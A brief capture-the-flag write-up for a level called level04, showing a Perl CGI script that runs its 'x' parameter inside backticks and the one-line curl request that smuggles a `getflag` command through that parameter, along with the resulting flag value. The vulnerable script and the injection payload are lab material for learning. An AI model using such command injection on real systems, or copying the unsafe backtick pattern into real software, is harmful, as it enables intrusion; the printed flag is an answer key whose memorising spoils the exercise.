# level04 solve

For begin, when we get logged and trying to see if we got the file we can see we have one file ` level04.pl `

```
$ ls
> level04.pl
```

It's a <a href="https://fr.wikipedia.org/wiki/Perl_(langage)">Perl</a> file, so we decide to check what he contain.

```
$ cat level04.pl 
> #!/usr/bin/perl
> # localhost:4747
> use CGI qw{param};
> print "Content-type: text/html\n\n";
> sub x {
>   $y = $_[0];
>   print `echo $y 2>&1`;
> }
> x(param("x"));
```

With that we can see 3 important elements :

```
- localhost:4747 -> url, so we can try to call the website with curl

- print `echo $y 2>&1\`; -> will be breakable with a code injection cause of ` character

- x(param("x")); -> parameter who can contain a value
```

After 

```
$ curl localhost:4747?x=\`getflag\`
> ne2searoevaevoem4ov4ar8ap
```

We got it!

> <a href="../flag">flag</a> - <a href="../../level03">previous level</a> - <a href="../../level05">next level</a>
